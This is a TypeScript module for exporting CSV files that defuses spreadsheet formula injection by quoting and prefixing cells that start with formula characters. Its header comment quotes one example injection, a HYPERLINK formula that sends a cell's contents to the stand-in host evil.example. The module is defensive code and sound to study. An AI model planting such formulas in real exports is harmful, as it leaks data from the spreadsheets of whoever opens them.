/**
 * CSV writing with spreadsheet formula-injection protection.
 *
 * Excel, LibreOffice and Google Sheets treat a cell that starts with `=`, `+`, `-` or `@` (and,
 * in some versions, a leading TAB or CR) as a formula. Exports carry text typed by the public —
 * an applicant name of `=HYPERLINK("https://evil.example?"&A1,"Click")` would otherwise run when
 * a staff member opens the file. Such a string is prefixed with a single quote (shown as text,
 * never evaluated) and always wrapped in double quotes.
 *
 * Numbers, booleans and dates are written as-is: they cannot carry a formula, and a negative
 * amount must stay numeric.
 */

export type CsvValue = string | number | bigint | boolean | Date | null | undefined;

const FORMULA_START = /^[=+\-@\t\r]/;

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "number" || typeof value === "bigint") return String(value);
  if (typeof value === "boolean") return value ? "true" : "false";
  if (value instanceof Date) return Number.isNaN(value.getTime()) ? "" : value.toISOString();
  let s = String(value);
  let mustQuote = false;
  if (FORMULA_START.test(s)) {
    s = `'${s}`;
    mustQuote = true;
  }
  return mustQuote || /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** One CSV line (no terminator). */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * A CSV document from plain records: the header row is the first record's keys (or
 * `fallbackHeaders` when there are no rows). Lines end in CRLF, as RFC 4180 and Excel expect.
 */
export function csvFromRecords(rows: readonly Record<string, unknown>[], fallbackHeaders: readonly string[] = []): string {
  const headers = rows[0] ? Object.keys(rows[0]) : [...fallbackHeaders];
  return [csvRow(headers), ...rows.map((r) => csvRow(headers.map((h) => r[h])))].join("\r\n");
}
